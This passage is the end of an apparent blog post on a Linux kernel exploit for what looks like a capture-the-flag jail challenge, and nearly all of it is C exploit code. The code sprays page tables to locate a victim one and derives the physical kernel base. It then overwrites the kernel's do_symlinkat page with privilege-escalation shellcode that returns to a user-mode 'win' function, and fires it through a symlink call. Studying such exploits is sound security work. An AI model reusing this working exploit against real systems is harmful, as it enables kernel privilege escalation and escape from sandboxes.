</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(*(size_t*)page_spray[i] &gt; </span><span style="color:#d08770;">0xffff</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">      wwwbuf = page_spray[i];
</span><span style="color:#c0c5ce;">      </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Found victim page table: </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, wwwbuf);
</span><span style="color:#c0c5ce;">      </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">  }
</span><span style="color:#c0c5ce;">  size_t phys_base = ((*(size_t*)wwwbuf) &amp; ~</span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) - </span><span style="color:#d08770;">0x1c04000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Physical kernel base address: 0x</span><span style="color:#d08770;">%016lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, phys_base);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">/**
</span><span style="color:#65737e;">   * Overwrite setxattr
</span><span style="color:#65737e;">   */
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Overwriting do_symlinkat...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  size_t phys_func = phys_base + </span><span style="color:#d08770;">0x24d4c0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  *(size_t*)dmabuf = (phys_func &amp; ~</span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) | </span><span style="color:#d08770;">0x8000000000000067</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> shellcode[] = {</span><span style="color:#d08770;">0xf3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xfa</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x81</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xef</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x37</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x82</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x53</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x90</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x27</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x11</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x37</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x98</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x07</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x31</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x04</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x08</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcc</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*p;
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x11\x11\x11\x11\x11\x11\x11\x11</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = </span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x22\x22\x22\x22\x22\x22\x22\x22</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = (size_t)&amp;win;
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x33\x33\x33\x33\x33\x33\x33\x33</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = user_cs;
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x44\x44\x44\x44\x44\x44\x44\x44</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = user_rflags;
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x55\x55\x55\x55\x55\x55\x55\x55</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = user_rsp;
</span><span style="color:#c0c5ce;">  p = </span><span style="color:#8fa1b3;">memmem</span><span style="color:#c0c5ce;">(shellcode, sizeof(shellcode), &quot;</span><span style="color:#96b5b4;">\x66\x66\x66\x66\x66\x66\x66\x66</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  *(size_t*)p = user_ss;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(wwwbuf + (phys_func &amp; </span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">), shellcode, sizeof(shellcode));
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] GO!GO!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">symlink</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/jail/x</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">/jail</span><span style="color:#c0c5ce;">&quot;));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Failed...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">getchar</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="reference">reference</h2><ul>
<li></li>
</ul>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="/script.js"></script>
</body>
</html>